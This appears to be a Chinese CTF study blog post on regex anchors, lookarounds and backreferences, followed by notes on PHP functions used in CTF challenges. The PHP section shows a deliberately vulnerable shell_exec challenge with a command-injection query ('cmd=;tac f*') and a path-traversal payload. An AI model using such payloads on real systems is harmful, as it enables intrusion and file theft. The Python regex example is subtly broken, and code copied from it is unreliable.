<td style="text-align:left">\b</td>
<td style="text-align:left">匹配一个单词边界，即字与空格间的位置</td>
<td style="text-align:left">[尝试一下 »](<a target="_blank" rel="noopener" href="https://www.runoob.com/try/try-regex.php?texts=aacat\">https://www.runoob.com/try/try-regex.php?texts=aacat\</a></td>
<td>catbb\</td>
<td>catcc&amp;tips=\bcat\w*)</td>
</tr>
<tr>
<td style="text-align:left">\B</td>
<td style="text-align:left">非单词边界匹配</td>
<td style="text-align:left">[尝试一下 »](<a target="_blank" rel="noopener" href="https://www.runoob.com/try/try-regex.php?texts=google\">https://www.runoob.com/try/try-regex.php?texts=google\</a></td>
<td>runoob\</td>
<td>taobao&amp;tips=\Boo\B)</td>
</tr>
</tbody>
</table>
</div>
<p><strong>注意</strong>：不能将限定符与定位符一起使用。由于在紧靠换行或者单词边界的前面或后面不能有一个以上位置，因此不允许诸如 <strong>^*</strong> 之类的表达式</p>
<p>若要匹配一行文本开始处的文本，请在正则表达式的开始使用 <strong>^</strong> 字符。不要将 <strong>^</strong> 的这种用法与中括号表达式内的用法混淆</p>
<p>若要匹配一行文本的结束处的文本，请在正则表达式的结束处使用 <strong>$</strong> 字符</p>
<p>若要在搜索章节标题时使用定位点，下面的正则表达式匹配一个章节标题，该<strong>标题只包含两个尾随数字，并且出现在行首</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^Chapter [1-9][0-9]&#123;0,1&#125;/</span><br></pre></td></tr></table></figure>
<p>如果要匹配的是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Chapter 1</span><br><span class="line">Chapter 5</span><br><span class="line">Chapter 10</span><br><span class="line">Chapter 99</span><br><span class="line">Chapter 123</span><br></pre></td></tr></table></figure>
<p>那么这段会匹配到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chapter 1</span><br><span class="line">Chapter 5</span><br><span class="line">Chapter 10</span><br><span class="line">Chapter 99</span><br></pre></td></tr></table></figure>
<p>真正的章节标题不仅出现行的开始处，而且它还是该行中仅有的文本。它既<strong>出现在行首又出现在同一行的结尾</strong>。下面的表达式能。通过创建只匹配一行文本的开始和结尾的正则表达式，就可做到这一点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^Chapter [1-9][0-9]&#123;0,1&#125;$/</span><br></pre></td></tr></table></figure>
<p>如果匹配：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Chapter 1</span><br><span class="line">Chapter 5</span><br><span class="line">Chapter 10</span><br><span class="line">Chapter 99</span><br><span class="line">Chapter 123</span><br><span class="line">Chapter 0</span><br><span class="line">Chapter</span><br><span class="line">Chapter 05</span><br><span class="line">Chapter 1 is referenced in Chapter 3</span><br></pre></td></tr></table></figure>
<p>只会匹配到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chapter 1</span><br><span class="line">Chapter 5</span><br><span class="line">Chapter 10</span><br><span class="line">Chapter 99</span><br></pre></td></tr></table></figure>
<p>匹配单词边界稍有不同，但向正则表达式添加了很重要的能力。<strong>单词边界是单词和空格之间的位置</strong>。非单词边界是任何其他位置。下面的表达式匹配单词 Chapter 的开头三个字符，因为这三个字符出现在单词边界后面：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/\bCha/</span><br></pre></td></tr></table></figure>
<p>如果你输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chapter 1</span><br><span class="line">Chaotic</span><br><span class="line">AChapter</span><br><span class="line">Cha</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>匹配的内容</strong>：<ul>
<li><code>Chapter 1</code>（匹配 <code>Cha</code>，出现在单词边界）</li>
<li><code>Chaotic</code>（匹配 <code>Cha</code>，出现在单词边界）</li>
<li><code>Cha</code>（匹配整个单词）</li>
</ul>
</li>
<li><strong>不匹配的内容</strong>：<ul>
<li><code>AChapter</code>（<code>Cha</code> 不在单词边界）</li>
</ul>
</li>
</ul>
<p><strong>\b</strong> 字符的位置是非常重要的。如果它位于要匹配的字符串的开始，它在单词的开始处查找匹配项。如果它位于字符串的结尾，它在单词的结尾处查找匹配项。例如，下面的表达式匹配单词 Chapter 中的字符串 ter，因为它出现在单词边界的前面：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ter\b/</span><br></pre></td></tr></table></figure>
<p>如果你输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">preter</span><br><span class="line">alter</span><br><span class="line">terraform</span><br><span class="line">terrestrial</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>匹配的内容</strong>：<ul>
<li><code>preter</code>（匹配 <code>ter</code>，出现在单词结尾）</li>
<li><code>alter</code>（匹配 <code>ter</code>，出现在单词结尾）</li>
</ul>
</li>
<li><strong>不匹配的内容</strong>：<ul>
<li><code>terraform</code>（<code>ter</code> 不在单词结尾）</li>
<li><code>terrestrial</code>（<code>ter</code> 不在单词结尾）</li>
</ul>
</li>
</ul>
<p>下面的表达式匹配 Chapter 中的字符串 apt，但不匹配 aptitude 中的字符串 apt：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/\Bapt/</span><br></pre></td></tr></table></figure>
<p>如果你输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chapter</span><br><span class="line">apartment</span><br><span class="line">Apt</span><br><span class="line">aptitude</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>匹配的内容</strong>：<ul>
<li><code>Chapter</code>（匹配<code>apt</code>，因为出现在非单词边界）</li>
</ul>
</li>
<li><strong>不匹配的内容</strong>：<ul>
<li><code>aptitude</code>（不匹配 <code>apt</code>，出现在单词边界）</li>
<li><code>Apt</code>（匹配 <code>Apt</code> 中的 <code>Apt</code>，但 <code>\B</code> 确保 <code>apt</code> 出现在非单词边界，但在这个例子中 <code>Apt</code> 是一个独立的单词，所以不匹配）</li>
</ul>
</li>
</ul>
<p>字符串 apt 出现在单词 Chapter 中的非单词边界处，但出现在单词 aptitude 中的单词边界处。对于 <strong>\B</strong> 非单词边界运算符，不可以匹配单词的开头或结尾，如果是下面的表达式，就不匹配 Chapter 中的 Cha：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\BCha</span><br></pre></td></tr></table></figure>
<p>同上原理，不作演示</p>
<hr>
<h3 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h3><p>用圆括号 <strong>()</strong> 将所有选择项括起来，相邻的选择项之间用 <strong>|</strong> 分隔</p>
<p><strong>()</strong> 表示捕获分组，<strong>()</strong> 会把每个分组里的匹配的值保存起来， 多个匹配值可以通过数字 n 来查看(<strong>n</strong> 是一个数字，表示第 n 个捕获组的内容)</p>
<p>比如你输入:  <strong>/([1-9])([a-z]+)/g</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123mihoyo114514zzz22</span><br></pre></td></tr></table></figure>
<p><img src="/img/lazy.gif" data-original="w21.png" alt=""></p>
<p>可以看到匹配到了两个，这个正则意思是第一位是数字然后后面匹配1或多个小写字母</p>
<p>但用圆括号会有一个副作用，使相关的匹配会被缓存，此时可用 <strong>?:</strong> 放在第一个选项前来消除这种副作用</p>
<p>其中 <strong>?:</strong> 是非捕获元之一，还有两个非捕获元是 <strong>?=</strong> 和 <strong>?!</strong>，这两个还有更多的含义，前者为正向预查，在<strong>任何开始匹配圆括号内的正则表达式模式的位置</strong>来匹配搜索字符串，后者为负向预查，在<strong>任何开始不匹配该正则表达式模式的位置</strong>来匹配搜索字符串</p>
<h4 id="exp1-exp2"><a href="#exp1-exp2" class="headerlink" title="exp1(?=exp2)"></a><strong>exp1(?=exp2)</strong></h4><p>查找exp2前面的exp1</p>
<p>还是沿用刚刚的例子，我们把正则语句改成  <strong>/mihoyo(?=\d)/</strong> 也就是匹配一个数字前面的mihoyo</p>
<p>可以看到：</p>
<p><img src="/img/lazy.gif" data-original="w22.png" alt=""></p>
<h4 id="lt-exp2-exp1"><a href="#lt-exp2-exp1" class="headerlink" title="(?&lt;=exp2)exp1"></a><strong>(?&lt;=exp2)exp1</strong></h4><p>查找 exp2 后面的 exp1</p>
<p>跟上面差不多，就是换了位置</p>
<h4 id="exp1-exp2-1"><a href="#exp1-exp2-1" class="headerlink" title="exp1(?!exp2)"></a><strong>exp1(?!exp2)</strong></h4><p>查找后面不是 exp2 的 exp1</p>
<p>我们把正则改成 <strong>/mihoyo(?![0-9]+)/</strong></p>
<p>沿用刚刚的例子，发现：</p>
<p><img src="/img/lazy.gif" data-original="w23.png" alt=""></p>
<p>匹配失败，而当我们在mihoyo后面加个非数字比如 <code>-</code>，那么就匹配得到了：</p>
<p><img src="/img/lazy.gif" data-original="w24.png" alt=""></p>
<h4 id="lt-exp2-exp1-1"><a href="#lt-exp2-exp1-1" class="headerlink" title="(?&lt;!exp2)exp1"></a><strong>(?&lt;!exp2)exp1</strong></h4><p>查找前面不是 exp2 的 exp1</p>
<p>也是和上面一样，但是换了个位置</p>
<hr>
<h3 id="反向引用"><a href="#反向引用" class="headerlink" title="反向引用"></a>反向引用</h3><ul>
<li><strong>定义与语法</strong> ：反向引用使用特殊字符来表示对前面某个分组的引用，通常用<code>\</code>后跟数字来表示。例如，<code>\1</code> 表示对第一个捕获组的反向引用，<code>\2</code>表示对第二个捕获组的反向引用，依此类推</li>
<li><strong>作用与应用场景</strong><ul>
<li><strong>匹配相同内容</strong> ：当需要匹配与前面某个特定模式相同的内容时，反向引用非常有用。例如，在验证某些格式的字符串时，如检查一个字符串是否为形如 <code>abc-abc</code> 这种前后部分相同的格式，可以使用反向引用。正则表达式可以写成 <code>^(\w+)-\1$</code>，其中<code>(\w+)</code>是一个捕获组，匹配前面的单词字符部分，后面的<code>\1</code>则表示匹配与第一个捕获组相同的内容</li>
<li><strong>替换操作</strong> ：在使用正则表达式进行字符串替换时，反向引用可以将捕获到的子表达式重新插入到替换后的字符串中。例如，将字符串中的日期格式从 <code>yyyy-mm-dd</code> 转换为 <code>dd-mm-yyyy</code> ，可以使用正则表达式 <code>(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)</code> 进行匹配和捕获，然后在替换字符串中使用反向引用，如 $3-$2-$1</li>
<li>（在某些语言中，反向引用的表示方式可能不同，例如在 JavaScript 中使用 $1、$2 等，在 Python 中使用 \g<1>、\g<2> 等）</li>
</ul>
</li>
</ul>
<p><strong>E.g1</strong></p>
<p>我现在有一段句子，里面包含多个重复的单词</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello hello world world this is is a test test</span><br></pre></td></tr></table></figure>
<p>我们可以用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(\b\w+\b)\s+\1</span><br></pre></td></tr></table></figure>
<p>来匹配，这里的\b\b就是取边界（边界也是一样的字符，遇到不一样的就不配），然后中间都是相同的字段</p>
<p><code>\s+</code> 负责匹配一个或多个空白符，<code>\1</code>就代表示匹配与第一个捕获组相同的内容，比如在这个例子中，第一个捕获组捕捉到的是 <code>hello</code>，<code>\1</code>就匹配后面也是<code>hello</code>的字符串，以此类推它可以捕获全部相同的字段</p>
<p><img src="/img/lazy.gif" data-original="w25.png" alt=""></p>
<p><strong>E.g2</strong></p>
<p>我们来匹配个URL，比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.example.com:8080/path/to/resource</span><br></pre></td></tr></table></figure>
<p>我们用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/(\w+):\/\/([^\:]+)(:\d*)?([^# ]*)/</span><br></pre></td></tr></table></figure>
<p><strong>1. <code>(\w+)</code></strong></p>
<ul>
<li><strong>含义</strong>: 匹配一个或多个字母、数字或下划线</li>
<li><strong>作用</strong>: 用于匹配 URL 的协议部分，例如 <code>http</code> 或 <code>https</code></li>
</ul>
<p><strong>2. <code>:\/\/</code></strong></p>
<ul>
<li><strong>含义</strong>: 匹配字面的 <code>://</code></li>
<li><strong>作用</strong>: 分隔协议部分和域名部分</li>
</ul>
<p><strong>3. <code>([^/:]+)</code></strong></p>
<ul>
<li><strong>含义</strong>: 匹配一个或多个不是 <code>/</code> 或 <code>:</code> 的字符</li>
<li><strong>作用</strong>: 用于匹配域名部分，例如 <code>www.example.com</code></li>
</ul>
<p><strong>4. <code>(:\d*)?</code></strong></p>
<ul>
<li><strong>含义</strong>:<ul>
<li><code>:</code>: 匹配字面的 <code>:</code></li>
<li><code>\d*</code>: 匹配零个或多个数字</li>
<li><code>?</code>: 表示整个部分是可选的。</li>
</ul>
</li>
<li><strong>作用</strong>: 用于匹配端口号部分，例如 <code>:8080</code>，但这个部分是可选的</li>
</ul>
<p><strong>5. <code>([^# ]*)</code></strong></p>
<ul>
<li><strong>含义</strong>: 匹配零个或多个不是 <code>#</code> 或空格的字符</li>
<li><strong>作用</strong>: 用于匹配 URL 的路径部分，例如 <code>/path/to/resource</code></li>
</ul>
<p><img src="/img/lazy.gif" data-original="w26.png" alt=""></p>
<p>用Python你可以这样：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.example.com:8080/path/to/resource&quot;</span></span><br><span class="line">pattern = <span class="string">r&#x27;/(\w+):\/\/([^\:]+)(:\d*)?([^# ]*)/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> = re.<span class="keyword">match</span>(pattern, url)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Protocol:&quot;</span>, <span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Domain:&quot;</span>, <span class="keyword">match</span>.group(<span class="number">2</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Port:&quot;</span>, <span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Path:&quot;</span>, <span class="keyword">match</span>.group(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No match&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><h3 id="PHP函数"><a href="#PHP函数" class="headerlink" title="PHP函数"></a>PHP函数</h3><p>（列一些遇到的和基本的）</p>
<h4 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h4><p>用于执行正则表达式匹配</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$subject</span>)</span><br></pre></td></tr></table></figure>
<p>$pattern是正则表达式，$subject是要匹配的字符串</p>
<h4 id="include"><a href="#include" class="headerlink" title="include()"></a>include()</h4><p>包含文件，将指定文件的内容嵌入到当前脚本中</p>
<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h4><p>执行里面的语句</p>
<h4 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h4><ul>
<li><code>parse_str()</code>函数直接将查询参数解析到当前作用域变量中</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$id</span>); <span class="comment">// 未使用第二个参数导致变量覆盖</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&quot;www.baidu.com&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    @<span class="title function_ invoke__">parse_str</span>(<span class="variable">$id</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span>[<span class="number">0</span>] == <span class="string">&#x27;www.polarctf.com&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> .= <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ping -c 2 &#x27;</span> . <span class="variable">$a</span>[<span class="number">0</span>] . <span class="variable">$ip</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$result&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;其实很简单！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>id=a[]=www.polarctf.com&amp;cmd=;tac f*</code></p>
<h4 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">is_numeric</span> ( <span class="keyword">mixed</span> <span class="variable">$var</span> )</span><br></pre></td></tr></table></figure>
<p>如果变量是数值或数值字符串，则返回 <code>true</code>，否则返回 <code>false</code></p>
<h4 id="strrev"><a href="#strrev" class="headerlink" title="strrev"></a>strrev</h4><p><code>strrev</code> 是 PHP 中用于反转字符串的函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strrev</span>(<span class="string">&quot;Hello World!&quot;</span>); <span class="comment">// 输出 &quot;!dlroW olleH&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="mb-strpos"><a href="#mb-strpos" class="headerlink" title="mb_strpos"></a>mb_strpos</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span> ( <span class="keyword">string</span> <span class="variable">$haystack</span> , <span class="keyword">string</span> <span class="variable">$needle</span> [, <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span> [, <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_internal_encoding</span>() ]] )</span><br></pre></td></tr></table></figure>
<ol>
<li><strong><code>$haystack</code></strong>:<ul>
<li>必需。要在其中搜索的字符串（主字符串）。</li>
</ul>
</li>
<li><strong><code>$needle</code></strong>:<ul>
<li>必需。要查找的字符或子字符串。</li>
</ul>
</li>
<li><strong><code>$offset</code></strong>:<ul>
<li>可选。指定从哪个位置开始搜索。默认值为 <code>0</code>（从字符串开头开始搜索）。</li>
</ul>
</li>
<li><strong><code>$encoding</code></strong>:<ul>
<li>可选。指定字符编码。如果未指定，默认使用 <code>mb_internal_encoding()</code> 函数返回的内部编码。</li>
</ul>
</li>
</ol>
<ul>
<li>返回 <code>$needle</code> 在 <code>$haystack</code> 中首次出现的位置（从 0 开始计数）。</li>
<li>如果未找到 <code>$needle</code>，返回 <code>false</code>。</li>
</ul>
<p><strong>示例代码</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查找单个字符的位置</span></span><br><span class="line"><span class="variable">$pos</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$string</span>, <span class="string">&quot;世&quot;</span>, <span class="number">0</span>, <span class="variable">$encoding</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;字符 &#x27;世&#x27; 的位置: &quot;</span> . <span class="variable">$pos</span>; <span class="comment">// 输出：字符 &#x27;世&#x27; 的位置: 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找子字符串的位置</span></span><br><span class="line"><span class="variable">$pos</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$string</span>, <span class="string">&quot;世界&quot;</span>, <span class="number">0</span>, <span class="variable">$encoding</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;子字符串 &#x27;世界&#x27; 的位置: &quot;</span> . <span class="variable">$pos</span>; <span class="comment">// 输出：子字符串 &#x27;世界&#x27; 的位置: 7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>):</span><br><span class="line">mb_strpos 是一个多字节字符串处理函数，用于查找指定字符的位置。</span><br><span class="line"><span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span> 是为了确保即使 <span class="variable">$page</span> 中没有问号 ?，也不会导致 mb_strpos 返回 <span class="literal">false</span>。</span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>) 的作用是找到 <span class="variable">$page</span> 中第一个问号 ? 的位置。</span><br><span class="line">如果 <span class="variable">$page</span> 中已经包含问号 ?，则返回问号的位置；如果 <span class="variable">$page</span> 中没有问号，则 <span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span> 会在末尾添加一个问号，返回问号的位置即字符串长度。</span><br></pre></td></tr></table></figure>
<p><code>?file=source.php%3f../../../../../ffffllllaaaagggg</code></p>
<h4 id="mb-substr"><a href="#mb-substr" class="headerlink" title="mb_substr"></a>mb_substr</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span> ( <span class="keyword">string</span> <span class="variable">$string</span> , <span class="keyword">int</span> <span class="variable">$start</span> [, <span class="keyword">int</span> <span class="variable">$length</span> = <span class="literal">NULL</span> [, <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_internal_encoding</span>() ]] )</span><br></pre></td></tr></table></figure>
<ol>
<li><strong><code>$string</code></strong>:<ul>
<li>必需。原始字符串。</li>
</ul>
</li>
<li><strong><code>$start</code></strong>:<ul>
<li>必需。指定从哪个位置开始截取。如果为正数，从字符串开头向后数 <code>$start</code> 个字符的位置开始；如果为负数，从字符串末尾向前数 <code>$start</code> 个字符的位置开始。</li>
</ul>
</li>
<li><strong><code>$length</code></strong>:<ul>
<li>可选。指定截取的长度。如果为正数，从 <code>$start</code> 位置开始向前数 <code>$length</code> 个字符；如果为负数，从 <code>$start</code> 位置开始到字符串末尾向前数 <code>$length</code> 个字符的位置；如果省略，则截取从 <code>$start</code> 到字符串末尾的所有字符。</li>
</ul>
</li>
<li><strong><code>$encoding</code></strong>:<ul>
<li>可选。指定字符编码。如果未指定，默认使用 <code>mb_internal_encoding()</code> 函数返回的内部编码。</li>
</ul>
</li>
</ol>
<ul>
<li>返回从 <code>$start</code> 开始，长度为 <code>$length</code> 的子字符串。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从第7个字符开始截取，长度为2</span></span><br><span class="line"><span class="variable">$sub</span> = <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$string</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="variable">$encoding</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sub</span>; <span class="comment">// 输出：世界</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从第7个字符开始截取到末尾</span></span><br><span class="line"><span class="variable">$sub</span> = <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$string</span>, <span class="number">7</span>, <span class="literal">NULL</span>, <span class="variable">$encoding</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sub</span>; <span class="comment">// 输出：世界!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从倒数第5个字符开始截取，长度为5</span></span><br><span class="line"><span class="variable">$sub</span> = <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$string</span>, -<span class="number">5</span>, <span class="number">5</span>, <span class="variable">$encoding</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sub</span>; <span class="comment">// 输出：, 世界!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从倒数第5个字符开始截取到倒数第2个字符</span></span><br><span class="line"><span class="variable">$sub</span> = <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$string</span>, -<span class="number">5</span>, -<span class="number">2</span>, <span class="variable">$encoding</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sub</span>; <span class="comment">// 输出：, 世</span></span><br></pre></td></tr></table></figure>
<h4 id="putenv"><a href="#putenv" class="headerlink" title="putenv"></a>putenv</h4><ol>
<li><strong><code>putenv</code> 函数</strong>:<ul>
<li><code>putenv</code> 是 PHP 中的一个函数，用于设置环境变量。</li>
<li>语法：<code>bool putenv ( string $setting )</code></li>
<li>参数 <code>$setting</code> 是一个字符串，格式为 <code>&quot;变量名=值&quot;</code>。</li>
</ul>
</li>
<li><strong><code>PATH=/home/rceservice/jail</code></strong>:<ul>
<li>这是设置 <code>PATH</code> 环境变量的值为 <code>/home/rceservice/jail</code>。</li>
<li><code>PATH</code> 环境变量用于指定系统在查找可执行文件时搜索的目录路径。</li>
</ul>
</li>
</ol>
<p>假设有一个 PHP 脚本需要执行外部命令 <code>ls</code>，并且 <code>PATH</code> 被设置为 <code>/home/rceservice/jail</code>：</p>
